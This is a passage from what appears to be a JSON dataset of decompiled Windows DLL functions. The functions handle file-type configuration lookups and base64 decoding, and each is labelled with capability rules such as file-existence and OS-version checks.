uint64_t **ppuStack296;\n    ulong uStack288;\n    ulong uStack280;\n    uchar auStack272 [24];\n    int64_t *piStack248;\n    ulong uStack240;\n    uint8_t uStack232;\n    uchar uStack231;\n    unkbyte6 Stack230;\n    int64_t iStack216;\n    uint64_t uStack208;\n    ulong ****appppuStack200 [2];\n    uint64_t uStack184;\n    uint64_t uStack176;\n    uint64_t ****ppppuStack168;\n    uint uStack160;\n    uint uStack156;\n    uint64_t *puStack152;\n    uint64_t uStack144;\n    uint64_t **var_80h;\n    uint64_t **ppuStack128;\n    int64_t var_70h_2;\n    uchar uStack112;\n    unkbyte7 Stack111;\n    ulong var_60h;\n    ulong var_58h;\n    uint64_t uStack88;\n    char acStack80 [8];\n    uint64_t var_40h;\n    ulong var_bp_38h;\n    ulong var_bp_30h;\n    ulong var_28h;\n    ulong var_20h_2;\n    ulong var_18h;\n    \n    uStack240 = 0xfffffffffffffffe;\n    var_40h = *0x180123080 ^ auStack504;\n    auStack384[0] = 0;\n    cStack456 = in_R9B;\n    ppppuStack376 = arg3;\n    uStack288 = arg1;\n    if (in_R9B == '\\0') {\n        fcn.180004730();\n        cVar6 = fcn.18000bcf0();\n        if (cVar6 == '\\0') goto code_r0x00018005f92f;\n    }\n    else {\n        fcn.1800047e0();\n    }\n    var_58h = 0;\n    uStack88 = 0xf;\n    uStack112 = 0;\n    fcn.180010fa0(&uStack112, 0x7fff);\n    _var_80h = ZEXT816(0);\n    var_70h_2 = 0;\n    ppuStack296 = &uStack360;\n    uStack344 = 0;\n    uStack336 = 0xf;\n    uStack360 = 0;\n    fcn.180011120(&uStack360, 0x1800f4a8f, 0);\n    uStack432 = CONCAT44(*0x180101914, *0x180101910);\n    uStack424 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack448._0_4_ = uStack448 & 0xffffff00;\n    fcn.180011120(&uStack448, 0x1800f4aa2, 0);\n    uStack400 = CONCAT44(*0x180101914, *0x180101910);\n    uStack392 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack416 = 0;\n    fcn.180011120(&uStack416, \"FileTypes\", 9);\n    iStack216 = CONCAT44(*0x180101914, *0x180101910);\n    uStack208 = CONCAT44(*0x18010191c, *0x180101918);\n    uStack232 = 0;\n    puVar19 = &uStack232;\n    fcn.180011120(puVar19, \"Base\", 4);\n    puStack464 = &uStack360;\n    puStack472 = &uStack448;\n    fcn.180009a40(puVar19, &var_80h, &uStack232, &uStack416);\n    if (uStack208 < 0x10) {\ncode_r0x00018005eecb:\n        iStack216 = CONCAT44(*0x180101914, *0x180101910);\n        uStack208 = CONCAT44(*0x18010191c, *0x180101918);\n        uStack232 = 0;\n        if (uStack392 < 0x10) {\ncode_r0x00018005ef19:\n            uStack400 = CONCAT44(*0x180101914, *0x180101910);\n            uStack392 = CONCAT44(*0x18010191c, *0x180101918);\n            uStack416 = 0;\n            if (0xf < uStack424) {\n                iVar22 = CONCAT44(uStack448._4_4_, uStack448);\n                iVar15 = iVar22;\n                if ((0xfff < uStack424 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U))\n                goto code_r0x00018005f96b;\n                fcn.18008fb24(iVar15);\n            }\n            ppuStack296 = ppuStack128;\n            if (var_80h != ppuStack128) {\n                do {\n                    puStack152 = NULL;\n                    uStack144 = 0;\n                    puVar3 = var_80h[2];\n                    arg2_02 = var_80h;\n                    if (0xf < var_80h[3]) {\n                        arg2_02 = *var_80h;\n                    }\n                    if (0xf < puVar3) {\n                        uVar21 = puVar3 | 0xf;\n                        if (0x7fffffffffffffff < uVar21) {\n                            uVar21 = 0x7fffffffffffffff;\n                        }\n                        ppppuVar11 = uVar21 + 1;\n                        if (ppppuVar11 < 0x1000) {\n                            if (ppppuVar11 != NULL) {\n                                ppppuVar11 = fcn.18008fb2c(ppppuVar11);\n                            }\ncode_r0x00018005f02a:\n                            ppppuStack168 = ppppuVar11;\n                            fcn.1800ade80(ppppuVar11, arg2_02, puVar3 + 1);\n                            uStack144 = uVar21;\n                            goto code_r0x00018005f041;\n                        }\n                        arg1_01 = uVar21 + 0x28;\n                        if (arg1_01 <= ppppuVar11) {\n                            arg1_01 = 0xffffffffffffffff;\n                        }\n                        pppuVar10 = fcn.18008fb2c(arg1_01);\n                        if (pppuVar10 != NULL) {\n                            ppppuVar11 = pppuVar10 + 0x27U & 0xffffffffffffffe0;\n                            ppppuVar11[-1] = pppuVar10;\n                            goto code_r0x00018005f02a;\n                        }\ncode_r0x00018005f9ad:\n                        fcn.1800b3528();\n                        goto code_r0x00018005f9b3;\n                    }\n                    ppppuStack168 = *arg2_02;\n                    uStack160 = *(arg2_02 + 1);\n                    uStack156 = *(arg2_02 + 0xc);\n                    uStack144 = 0xf;\ncode_r0x00018005f041:\n                    bVar5 = false;\n                    uVar21 = 0;\n                    auStack384[0] = 0;\n                    puStack152 = puVar3;\n                    do {\n                        uVar24 = uVar21 + 1;\n                        uVar21 = uVar24;\n                        fcn.180020af0(acStack80, 5, \"%02d\", uVar21);\n                        puStack368 = &uStack416;\n                        uStack400 = 0;\n                        uStack392 = 0xf;\n                        uStack416 = 0;\n                        fcn.180011120(&uStack416, 0x1800f4aa3, 0);\n                        iStack216 = 0;\n                        uStack208 = 0xf;\n                        uStack232 = 0;\n                        iVar15 = -1;\n                        do {\n                            iVar23 = iVar15 + 1;\n                            iVar22 = iVar15 + 1;\n                            iVar15 = iVar23;\n                        } while (acStack80[iVar22] != '\\0');\n                        pcVar20 = acStack80;\n                        fcn.180011120(&uStack232, pcVar20, iVar23);\n                        puVar19 = &uStack232;\n                        puVar12 = fcn.180020820(puVar19, pcVar20, \"ADFT_Line_\", 10);\n                        uStack448._0_4_ = *puVar12;\n                        uStack448._4_4_ = puVar12[1];\n                        uStack440 = puVar12[2];\n                        uStack436 = puVar12[3];\n                        uStack432 = *(puVar12 + 4);\n                        uStack424 = *(puVar12 + 6);\n                        *(puVar12 + 4) = 0;\n                        *(puVar12 + 6) = 0xf;\n                        *puVar12 = 0;\n                        puStack472 = &uStack416;\n                        iVar7 = fcn.1800054e0(puVar19, &ppppuStack168, &uStack448, auStack384);\n                        if (0xf < uStack424) {\n                            iVar22 = CONCAT44(uStack448._4_4_, uStack448);\n                            iVar15 = iVar22;\n                            if ((0xfff < uStack424 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U))\n                            goto code_r0x00018005f971;\n                            fcn.18008fb24(iVar15);\n                        }\n                        uStack432 = 0;\n                        uStack424 = 0xf;\n                        uStack448._0_4_ = uStack448 & 0xffffff00;\n                        if (0xf < uStack208) {\n                            iVar22 = CONCAT62(Stack230, CONCAT11(uStack231, uStack232));\n                            iVar15 = iVar22;\n                            if ((0xfff < uStack208 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U))\n                            goto code_r0x00018005f977;\n                            fcn.18008fb24(iVar15);\n                        }\n                        if (iVar7 != 0) {\n                            puStack368 = auStack328;\n                            uStack312 = 0;\n                            uStack304 = 0xf;\n                            auStack328[0]._0_1_ = 0;\n                            fcn.180011120(auStack328, 0x1800f4abb, 0);\n                            uStack400 = 0;\n                            uStack392 = 0xf;\n                            uStack416 = 0;\n                            fcn.180011120(&uStack416, 0x1800f4aba, 0);\n                            uStack344 = 0;\n                            uStack336 = 0xf;\n                            uStack360 = 0;\n                            iVar15 = -1;\n                            do {\n                                iVar23 = iVar15 + 1;\n                                iVar22 = iVar15 + 1;\n                                iVar15 = iVar23;\n                            } while (acStack80[iVar22] != '\\0');\n                            pcVar20 = acStack80;\n                            fcn.180011120(&uStack360, pcVar20, iVar23);\n                            puVar16 = &uStack360;\n                            puVar12 = fcn.180020820(puVar16, pcVar20, \"ADFT_Regex_\", 0xb);\n                            uStack448._0_4_ = *puVar12;\n                            uStack448._4_4_ = puVar12[1];\n                            uStack440 = puVar12[2];\n                            uStack436 = puVar12[3];\n                            uStack432 = *(puVar12 + 4);\n                            uStack424 = *(puVar12 + 6);\n                            *(puVar12 + 4) = 0;\n                            *(puVar12 + 6) = 0xf;\n                            *puVar12 = 0;\n                            puStack464 = auStack328;\n                            puStack472 = &uStack416;\n                            fcn.180004b90(puVar16, appppuStack200, &ppppuStack168, &uStack448);\n                            if (0xf < uStack424) {\n                                iVar22 = CONCAT44(uStack448._4_4_, uStack448);\n                                iVar15 = iVar22;\n                                if ((0xfff < uStack424 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U)\n                                   ) goto code_r0x00018005f97d;\n                                fcn.18008fb24(iVar15);\n                            }\n                            uStack432 = 0;\n                            uStack424 = 0xf;\n                            uStack448._0_4_ = uStack448 & 0xffffff00;\n                            if (0xf < uStack336) {\n                                iVar22 = CONCAT71(Stack359, uStack360);\n                                iVar15 = iVar22;\n                                if ((0xfff < uStack336 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U)\n                                   ) goto code_r0x00018005f983;\n                                fcn.18008fb24(iVar15);\n                            }\n                            uStack344 = 0;\n                            uStack336 = 0xf;\n                            uStack360 = 0;\n                            if (0xf < uStack392) {\n                                iVar22 = CONCAT71(Stack415, uStack416);\n                                iVar15 = iVar22;\n                                if ((0xfff < uStack392 + 1) && (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U)\n                                   ) goto code_r0x00018005f989;\n                                fcn.18008fb24(iVar15);\n                            }\n                            uStack400 = 0;\n                            uStack392 = 0xf;\n                            uStack416 = 0;\n                            if ((uStack184 != 0) && (cVar6 = fcn.180067b90(appppuStack200),  cVar6 == '\\0')) {\n                                iVar8 = (**0x1800de7f0)(arg2, 0x86a);\n                                iVar18 = -1;\n                                if (iVar7 < 0) {\n                                    iVar18 = iVar8;\n                                }\n                                iVar7 = iVar7 + iVar18;\n                                if ((-1 < iVar7) && (iVar7 < iVar8)) {\n                                    uVar1 = uStack184 - 1;\n                                    iStack216 = 0;\n                                    uStack208 = 0xf;\n                                    uStack232 = 0;\n                                    if (uVar1 <= uStack184) {\n                                        iVar15 = -1;\n                                        if (uStack184 - uVar1 != -1) {\n                                            iVar15 = uStack184 - uVar1;\n                                        }\n                                        ppppuVar14 = appppuStack200;\n                                        if (0xf < uStack176) {\n                                            ppppuVar14 = appppuStack200[0];\n                                        }\n                                        fcn.180011120(&uStack232, ppppuVar14 + uVar1, iVar15);\n                                        puVar19 = CONCAT62(Stack230, CONCAT11(uStack231, uStack232));\n                                        puVar13 = &uStack232;\n                                        if (0xf < uStack208) {\n                                            puVar13 = puVar19;\n                                        }\n                                        if (iStack216 == 1) {\n                                            if (*puVar13 == 0x24) {\n                                                uVar9 = 0;\n                                            }\n                                            else {\n                                                uVar9 = -(*puVar13 < 0x24) | 1;\n                                            }\n                                            if (uVar9 != 0) goto code_r0x00018005f47e;\n                                            bVar5 = false;\n                                        }\n                                        else {\ncode_r0x00018005f47e:\n                                            bVar5 = true;\n                                        }\n                                        if (uStack208 < 0x10) {\ncode_r0x00018005f4b3:\n                                            uVar1 = uStack184;\n                                            if (bVar5) {\n                                                if (uStack176 - uStack184 < 2) {\n                                                    puStack472 = 0x2;\n                                                    fcn.180014270(appppuStack200, 2, 0, 0x1800f9694);\n                                                }\n                                                else {\n                                                    ppppuVar14 = appppuStack200;\n                                                    if (0xf < uStack176) {\n                                                        ppppuVar14 = appppuStack200[0];\n                                                    }\n                                                    puVar2 = ppppuVar14 + uStack184;\n                                                    uStack184 = uStack184 + 2;\n                                                    *puVar2 = 0x2a2e;\n                                                    *(ppppuVar14 + uVar1 + 2) = 0;\n                                                }\n                                            }\n                                            iVar22 = iVar7;\n                                            (**0x1800de7f0)(arg2, 0x869, iVar22);\n                                            iVar15 = (**0x1800de7f0)(arg2, 0x877, iVar22);\n                                            iVar22 = (**0x1800de7f0)(arg2, 0x858, iVar22);\n                                            arg2_01 = &uStack112;\n                                            if (0xf < uStack88) {\n                                                arg2_01 = CONCAT71(Stack111, uStack112);\n                                            }\n                                            uStack280 = 0;\n                                            fcn.18002ddc0(auStack272);\n                                            ppppuVar14 = appppuStack200;\n                                            if (0xf < uStack176) {\n                                                ppppuVar14 = appppuStack200[0];\n                                            }\n                                            arg2_00 = appppuStack200;\n                                            if (0xf < uStack176) {\n                                                arg2_00 = appppuStack200[0];\n                                            }\n                                            fcn.18002f0b0(&uStack280, arg2_00, uStack184 + ppppuVar14);\n                                            iStack216 = 0;\n                                            uStack208 = 0xf;\n                                            uStack232 = 0;\n                                            fcn.180011120(&uStack232, arg2_01, iVar22 - iVar15);\n                                            cVar6 = fcn.18003c420(&uStack232, &uStack280);\n                                            if (0xf < uStack208) {\n                                                iVar22 = CONCAT62(Stack230, CONCAT11(uStack231, uStack232));\n                                                iVar15 = iVar22;\n                                                if ((0xfff < uStack208 + 1) &&\n                                                   (iVar15 = *(iVar22 + -8),  0x1f < (iVar22 - iVar15) - 8U))\n                                                goto code_r0x00018005f995;\n                                                fcn.18008fb24(iVar15);\n                                            }\n                                            iStack216 = 0;\n                                            uStack208 = 0xf;\n                                            uStack232 = 0;\n                                            fcn.18002e090(&uStack280);\n                                            if ((piStack248 != NULL) &&\n                                               (puVar16 = (**(*piStack248 + 0x10))(),  puVar16 != NULL)) {\n                                                (***puVar16)(puVar16, 1);\n                                            }\n                                            if (cVar6 != '\\0') {\n                                                bVar5 = true;\n                                                goto code_r0x00018005f66f;\n                                            }\n                                            bVar5 = false;\n                                            if (0xf < uStack176) {\n                                                ppppuVar14 = appppuStack200[0];\n                                                if ((0xfff < uStack176 + 1) &&\n                                                   (ppppuVar14 = appppuStack200[0][-1], \n                                                   0x1f < appppuStack200[0] + (-8 - ppppuVar14)))\n                                                goto code_r0x00018005f9a1;\n                                                fcn.18008fb24(ppppuVar14);\n                                                bVar5 = false;\n                                            }\n                                            break;\n                                        }\n                                        puVar13 = puVar19;\n                                        if (uStack208 + 1 < 0x1000) {\ncode_r0x00018005f4ae:\n                                            fcn.18008fb24(puVar13);\n                                            goto code_r0x00018005f4b3;\n                                        }\n                                        puVar13 = *(puVar19 + -8);\n                                        if (puVar19 + (-8 - puVar13) < 0x20) goto code_r0x00018005f4ae;\n                                        fcn.1800b3528(puVar13, uStack208 + 0x28);\ncode_r0x00018005f995:\n                                        fcn.1800b3528();\n                                    }\n                                    fcn.180011cd0();\n                                    goto code_r0x00018005f9a1;\n                                }\n                            }\ncode_r0x00018005f66f:\n                            if (0xf < uStack176) {\n                                ppppuVar14 = appppuStack200[0];\n                                if ((0xfff < uStack176 + 1) &&\n                                   (ppppuVar14 = appppuStack200[0][-1],  0x1f < appppuStack200[0] + (-8 - ppppuVar14)))\n                                {\ncode_r0x00018005f9a1:\n                                    fcn.1800b3528();\n                                    pcVar4 = swi(3);\n                                    (*pcVar4)();\n                                    return;\n                                }\n                                fcn.18008fb24(ppppuVar14);\n                            }\n                        }\n                    } while (uVar24 < 3);\n                    arg3 = ppppuStack376;\n                    if (bVar5) {\n                        if (ppppuStack376 != &ppppuStack168) {\n                            ppppuVar11 = &ppppuStack168;\n                            if (0xf < uStack144) {\n                                ppppuVar11 = ppppuStack168;\n                            }\n                            fcn.180011120(ppppuStack376, ppppuVar11, puStack152);\n                        }\n                        uVar17 = fcn.18000de50(auStack328, arg3);\n                        arg1_00 = uStack288;\n                        fcn.1800608d0(uStack288, uVar17);\n                        iStack216 = CONCAT44(*0x180101904, *0x180101900);\n                        uStack208 = CONCAT44(*0x18010190c, *0x180101908);\n                        uStack232 = 0;\n                        uStack231 = 0;\n                        cVar6 = fcn.180060420(arg1_00, &uStack232);\n                        if (cVar6 == '\\0') {\n                            puStack368 = &uStack416;\n                            uVar17 = fcn.18000de50(&uStack416, arg3);\n                            uStack312 = 0;\n                            uStack304 = 0xf;\n                            auStack328[0]._0_1_ = 0;\n                            fcn.180011120(auStack328, 0x1800f4abe, 0);\n                            fcn.1800609f0(arg1_00, auStack328, uVar17);\n                            arg3 = ppppuStack376;\n                        }\n                        if (7 < uStack208) {\n                            iVar22 = CONCAT62(Stack230, CONCAT11(uStack231, uStack232));\n                            iVar15 = iVar22;\n                            if (0xfff < uStack208 * 2 + 2) {\n                                iVar15 = *(iVar22 + -8);\n                                if (0x1f < (iVar22 - iVar15) - 8U) {\n                                    fcn.1800b3528(iVar15, uStack208 * 2 + 0x29);\n                                    goto code_r0x00018005f9ad;\n                                }\n                            }\n                            fcn.18008fb24(iVar15);\n                        }\n                        if (0xf < uStack144) {\n                            ppppuVar11 = ppppuStack168;\n                            if ((0xfff < uStack144 + 1) &&\n                               (ppppuVar11 = ppppuStack168[-1],  0x1f < ppppuStack168 + (-8 - ppppuVar11)))\n                            goto code_r0x00018005f9ad;\n                            fcn.18008fb24(ppppuVar11);\n                        }\n                        break;\n                    }\n                    if (0xf < uStack144) {\n                        ppppuVar11 = ppppuStack168;\n                        if ((0xfff < uStack144 + 1) &&\n                           (ppppuVar11 = ppppuStack168[-1],  0x1f < ppppuStack168 + (-8 - ppppuVar11)))\n                        goto code_r0x00018005f9ad;\n                        fcn.18008fb24(ppppuVar11);\n                    }\n                    var_80h = var_80h + 4;\n                    arg3 = ppppuStack376;\n                } while (var_80h != ppuStack296);\n            }\n            if ((cStack456 != '\\0') && (arg3[2] == NULL)) {\n                fcn.180004730();\n            }\n            if (var_80h != NULL) {\n                fcn.180013b30(var_80h, ppuStack128);\n                iVar15 = var_80h;\n                if ((0xfff < (var_70h_2 - var_80h & 0xffffffffffffffe0U)) &&\n                   (iVar15 = *(var_80h + -8),  0x1f < (var_80h - iVar15) - 8U)) {\ncode_r0x00018005f9b3:\n                    fcn.1800b3528();\n                    pcVar4 = swi(3);\n                    (*pcVar4)();\n                    return;\n                }\n                fcn.18008fb24(iVar15);\n                _var_80h = extraout_XMM0 & 0x0;\n                var_70h_2 = 0;\n            }\n            if (uStack88 < 0x10) goto code_r0x00018005f92f;\n            iVar22 = CONCAT71(Stack111, uStack112);\n            iVar15 = iVar22;\n            if (0xfff < uStack88 + 1) {\n                iVar15 = *(iVar22 + -8);\n                if (0x1f < (iVar22 - iVar15) - 8U) {\n                    fcn.1800b3528(iVar15, uStack88 + 0x28);\n                    goto code_r0x00018005f95f;\n                }\n            }\n            fcn.18008fb24(iVar15);\ncode_r0x00018005f92f:\n            fcn.18008fb00(var_40h ^ auStack504);\n            return;\n        }\n        iVar22 = CONCAT71(Stack415, uStack416);\n        iVar15 = iVar22;\n        if ((uStack392 + 1 < 0x1000) || (iVar15 = *(iVar22 + -8),  (iVar22 - iVar15) - 8U < 0x20)) {\n            fcn.18008fb24(iVar15);\n            goto code_r0x00018005ef19;\n        }\n    }\n    else {\n        iVar22 = CONCAT62(Stack230, CONCAT11(uStack231, uStack232));\n        iVar15 = iVar22;\n        if ((uStack208 + 1 < 0x1000) || (iVar15 = *(iVar22 + -8),  (iVar22 - iVar15) - 8U < 0x20)) {\n            fcn.18008fb24(iVar15);\n            goto code_r0x00018005eecb;\n        }\ncode_r0x00018005f95f:\n        fcn.1800b3528();\n    }\n    fcn.1800b3528();\ncode_r0x00018005f96b:\n    fcn.1800b3528();\ncode_r0x00018005f971:\n    fcn.1800b3528();\ncode_r0x00018005f977:\n    fcn.1800b3528();\ncode_r0x00018005f97d:\n    fcn.1800b3528();\ncode_r0x00018005f983:\n    fcn.1800b3528();\ncode_r0x00018005f989:\n    fcn.1800b3528();\n    pcVar4 = swi(3);\n    (*pcVar4)();\n    return;\n}\n",
        "token_count": 6960
    },
    "18006106": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1fh\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Variable defined which should be unmapped: var_9h\n// WARNING: Variable defined which should be unmapped: var_11h\n// WARNING: Variable defined which should be unmapped: var_19h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.180061060(int64_t arg1, int64_t *arg2)\n\n{\n    uint8_t **ppuVar1;\n    code *pcVar2;\n    bool bVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint8_t **ppuVar6;\n    uchar *arg1_00;\n    int64_t iVar7;\n    int64_t iVar8;\n    ulong arg2_00;\n    ulong arg3;\n    ulong var_fh;\n    ulong var_1fh;\n    ulong var_27h;\n    ulong var_2fh;\n    uchar auStack280 [32];\n    uchar *puStack248;\n    uchar *puStack240;\n    uchar uStack232;\n    unkbyte7 Stack231;\n    uint uStack216;\n    uint uStack212;\n    uint uStack208;\n    uint uStack204;\n    uchar auStack200 [16];\n    ulong uStack184;\n    ulong uStack176;\n    uchar uStack168;\n    unkbyte7 Stack167;\n    uint uStack152;\n    uint uStack148;\n    uint uStack144;\n    uint uStack140;\n    uchar uStack136;\n    uchar auStack135 [6];\n    ulong var_79h;\n    ulong var_71h;\n    ulong var_69h;\n    uchar auStack104 [7];\n    uchar *var_59h;\n    int64_t *var_51h;\n    ulong var_49h;\n    ulong var_39h;\n    uint64_t var_31h;\n    uint64_t var_29h;\n    ulong var_19h;\n    ulong var_11h;\n    ulong var_9h;\n    ulong var_1h;\n    \n    _auStack104 = 0xfffffffffffffffe;\n    *NULL = *0x180123080 ^ auStack280;\n    stack0xffffffffffffffc0 = *0x180101900;\n    stack0xffffffffffffffc8 = *0x180101908;\n    arg3 = 0;\n    var_49h._1_2_ = 0;\n    unique0x10000390 = arg2;\n    iVar4 = (**0x1800de740)(*0x180101900, *(arg1 + 0x18), 0x235d);\n    if ((arg2[2] < 2) || (iVar4 == 0)) {\n        arg2_00 = 0x1800f9704;\ncode_r0x0001800612ac:\n        fcn.180010d70(&var_49h + 1, arg2_00, arg3);\n        iVar7 = &var_49h + 1;\n        if (7 < stack0xffffffffffffffc8) {\n            iVar7 = CONCAT62(stack0xffffffffffffffb2, var_49h._1_2_);\n        }\n        (**0x1800de788)(*(arg1 + 0x18), 0x235e, iVar7);\n        if (stack0xffffffffffffffc8 < 8) {\ncode_r0x000180061312:\n            stack0xffffffffffffffc0 = *0x180101900;\n            stack0xffffffffffffffc8 = *0x180101908;\n            var_49h._1_2_ = 0;\n            if (arg2[3] < 0x10) {\ncode_r0x00018006135a:\n                arg2[2] = 0;\n                arg2[3] = 0xf;\n                *arg2 = 0;\n                fcn.18008fb00(stack0xffffffffffffffd0 ^ auStack280);\n                return;\n            }\n            iVar7 = *arg2;\n            iVar8 = iVar7;\n            if ((arg2[3] + 1U < 0x1000) || (iVar8 = *(iVar7 + -8),  (iVar7 - iVar8) - 8U < 0x20)) {\n                fcn.18008fb24(iVar8);\n                goto code_r0x00018006135a;\n            }\n        }\n        else {\n            iVar8 = CONCAT62(stack0xffffffffffffffb2, var_49h._1_2_);\n            iVar7 = iVar8;\n            if (stack0xffffffffffffffc8 * 2 + 2 < 0x1000) {\ncode_r0x00018006130d:\n                fcn.18008fb24(iVar7);\n                goto code_r0x000180061312;\n            }\n            iVar7 = *(iVar8 + -8);\n            if ((iVar8 - iVar7) - 8U < 0x20) goto code_r0x00018006130d;\n            fcn.1800b3528(iVar7, stack0xffffffffffffffc8 * 2 + 0x29);\n        }\n        fcn.1800b3528();\ncode_r0x000180061398:\n        fcn.1800b3528();\n    }\n    else {\n        if (iVar4 == 1) {\n            arg2_00 = 0x1800f9de4;\n            arg3 = 1;\n            goto code_r0x0001800612ac;\n        }\n        unique0x00003100 = auStack200;\n        uStack184 = 0;\n        uStack176 = 0xf;\n        auStack200[0] = 0;\n        fcn.180011120(auStack200, 0x1800f4bbd, 0);\n        uStack152 = *0x180101910;\n        uStack148 = *0x180101914;\n        uStack144 = *0x180101918;\n        uStack140 = *0x18010191c;\n        uStack168 = 0;\n        arg3 = 1;\n        fcn.180011120(&uStack168, 0x1800f9efc, 1);\n        uStack216 = *0x180101910;\n        uStack212 = *0x180101914;\n        uStack208 = *0x180101918;\n        uStack204 = *0x18010191c;\n        uStack232 = 0;\n        arg1_00 = &uStack232;\n        fcn.180011120(arg1_00, \"MultiByteChars\", 0xe);\n        puStack240 = auStack200;\n        puStack248 = &uStack168;\n        ppuVar6 = fcn.180004b90(arg1_00, &uStack136, arg2, &uStack232);\n        ppuVar1 = ppuVar6 + 2;\n        if (0xf < ppuVar6[3]) {\n            ppuVar6 = *ppuVar6;\n        }\n        if (*ppuVar1 == 0x1) {\n            if (*ppuVar6 == 0x59) {\n                uVar5 = 0;\n            }\n            else {\n                uVar5 = -(*ppuVar6 < 0x59) | 1;\n            }\n            if (uVar5 != 0) goto code_r0x0001800611b3;\n            bVar3 = true;\n        }\n        else {\ncode_r0x0001800611b3:\n            bVar3 = false;\n        }\n        if (0xf < CONCAT44(stack0xffffffffffffff94, var_69h._1_4_)) {\n            iVar8 = CONCAT71(_auStack135, uStack136);\n            iVar7 = iVar8;\n            if ((CONCAT44(stack0xffffffffffffff94, var_69h._1_4_) + 1 < 0x1000) ||\n               (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n                fcn.18008fb24(iVar7);\n                goto code_r0x0001800611f1;\n            }\n            goto code_r0x000180061398;\n        }\ncode_r0x0001800611f1:\n        var_71h._1_4_ = *0x180101910;\n        stack0xffffffffffffff8c = *0x180101914;\n        var_69h._1_4_ = *0x180101918;\n        stack0xffffffffffffff94 = *0x18010191c;\n        uStack136 = 0;\n        if (CONCAT44(uStack204, uStack208) < 0x10) {\ncode_r0x00018006123e:\n            uStack216 = *0x180101910;\n            uStack212 = *0x180101914;\n            uStack208 = *0x180101918;\n            uStack204 = *0x18010191c;\n            uStack232 = 0;\n            if (0xf < CONCAT44(uStack140, uStack144)) {\n                iVar8 = CONCAT71(Stack167, uStack168);\n                iVar7 = iVar8;\n                if ((0xfff < CONCAT44(uStack140, uStack144) + 1) &&\n                   (iVar7 = *(iVar8 + -8),  0x1f < (iVar8 - iVar7) - 8U)) goto code_r0x0001800613a4;\n                fcn.18008fb24(iVar7);\n            }\n            if (bVar3) {\n                arg2_00 = 0x1800f9f34;\n            }\n            else {\n                arg2_00 = 0x1800f9fbc;\n            }\n            goto code_r0x0001800612ac;\n        }\n        iVar8 = CONCAT71(Stack231, uStack232);\n        iVar7 = iVar8;\n        if ((CONCAT44(uStack204, uStack208) + 1 < 0x1000) || (iVar7 = *(iVar8 + -8),  (iVar8 - iVar7) - 8U < 0x20)) {\n            fcn.18008fb24(iVar7);\n            goto code_r0x00018006123e;\n        }\n    }\n    fcn.1800b3528();\ncode_r0x0001800613a4:\n    fcn.1800b3528();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 2314
    },
    "1800651b": {
        "rules": [
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint8_t * fcn.1800651b0(uint8_t *arg1, uint32_t *arg2)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint32_t uVar4;\n    uint64_t uVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    uint8_t *puVar8;\n    \n    if ((arg1 != NULL) && (uVar7 = *arg2,  uVar7 != 0)) {\n        uVar5 = uVar7;\n        do {\n            uVar4 = uVar5 - 1;\n            uVar5 = uVar4;\n            if (\"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[uVar5]] < 0x40) break;\n            *arg2 = uVar4;\n            uVar7 = uVar4;\n        } while (uVar4 != 0);\n        puVar6 = (**0x1800de418)();\n        if (puVar6 != NULL) {\n            uVar4 = *arg2;\n            puVar8 = puVar6;\n            while (4 < uVar4) {\n                uVar3 = *arg1;\n                *arg2 = *arg2 - 4;\n                uVar4 = *arg2;\n                *puVar8 = \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[uVar3] << 2 |\n                          \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[1]] >> 4;\n                puVar8[1] = \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[2]] >> 2 |\n                            \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[1]] << 4;\n                puVar1 = arg1 + 2;\n                puVar2 = arg1 + 3;\n                arg1 = arg1 + 4;\n                puVar8[2] = \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[*puVar1] << 6 |\n                            \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[*puVar2];\n                puVar8 = puVar8 + 3;\n            }\n            if (1 < uVar4) {\n                *puVar8 = \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[arg1[1]] >> 4 |\n                          \"@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@>@@@?456789:;<=@@@@@@@\"[*arg1] << 2;\n                puVar8 = puVar8 + 1;\n            }\n            if (2 < uVar4) {\n                *puVar8 = 